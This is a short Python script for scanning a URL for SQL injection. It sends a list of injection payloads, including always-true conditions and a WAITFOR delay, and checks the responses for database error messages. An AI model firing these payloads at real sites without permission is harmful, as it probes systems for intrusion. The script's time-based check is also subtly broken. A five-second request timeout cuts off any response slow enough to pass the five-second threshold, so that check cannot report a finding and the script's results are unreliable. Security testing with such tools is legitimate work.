import requests
import time

SQL_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1 --",
    "'; WAITFOR DELAY '0:0:5' --"
]

SQL_ERRORS = [
    "mysql_fetch",
    "SQL syntax",
    "Warning: mysql",
    "Unclosed quotation mark",
    "quoted string not properly terminated"
]

def scan_sqli(url):
    print("\nChecking for SQL Injection...\n")

    for payload in SQL_PAYLOADS:
        test_url = url + payload
        try:
            start_time = time.time()
            response = requests.get(test_url, timeout=5)
            end_time = time.time()

            # Error-based detection
            for error in SQL_ERRORS:
                if error.lower() in response.text.lower():
                    print(f"[HIGH] SQL Injection vulnerability detected with payload: {payload}")
                    return

            # Time-based detection
            if end_time - start_time > 5:
                print(f"[HIGH] Possible Time-Based SQL Injection detected with payload: {payload}")
                return

        except requests.exceptions.RequestException:
            continue

    print("[OK] No SQL Injection vulnerability detected.")